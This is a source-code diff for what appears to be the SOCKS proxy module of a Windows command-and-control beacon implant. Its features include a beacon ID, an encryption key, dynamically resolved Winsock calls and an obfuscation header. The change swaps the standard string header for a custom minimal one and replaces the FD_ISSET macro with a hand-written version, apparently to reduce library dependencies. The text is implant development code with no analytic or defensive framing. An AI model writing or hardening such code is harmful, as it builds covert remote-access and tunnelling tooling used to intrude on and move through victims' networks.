@@ -1,12 +1,12 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
-#include <string.h>
 #include "socks.h"
 #include "protocol.h"
 #include "crypto.h"
 #include "dynapi.h"
 #include "obf.h"
+#include "mini_std.h"
 
 socks_channel_t g_socks_channels[MAX_SOCKS_CHANNELS];
 SOCKET           g_socks_sock = INVALID_SOCKET;
@@ -14,6 +14,15 @@ uint8_t          g_socks_key[32];
 uint32_t         g_socks_beacon_id;
 static CRITICAL_SECTION g_socks_write_cs;
 static volatile LONG    g_socks_cs_init = 0;
+
+static int socks_fd_isset(SOCKET s, const fd_set *set) {
+    u_int i;
+    if (!set) return 0;
+    for (i = 0; i < set->fd_count; i++) {
+        if (set->fd_array[i] == s) return 1;
+    }
+    return 0;
+}
 
 static void ensure_socks_cs_init(void) {
     if (InterlockedCompareExchange(&g_socks_cs_init, 1, 0) == 0) {
@@ -239,7 +248,7 @@ static SOCKET socks_connect_target(const uint8_t *payload, uint32_t payload_len)
     tv.tv_usec = 0;
 
     int sel = fnSelect(0, NULL, &wset, &eset, &tv);
-    if (sel <= 0 || FD_ISSET(s, &eset)) {
+    if (sel <= 0 || socks_fd_isset(s, &eset)) {
         fnClosesocket(s);
         return INVALID_SOCKET;
     }
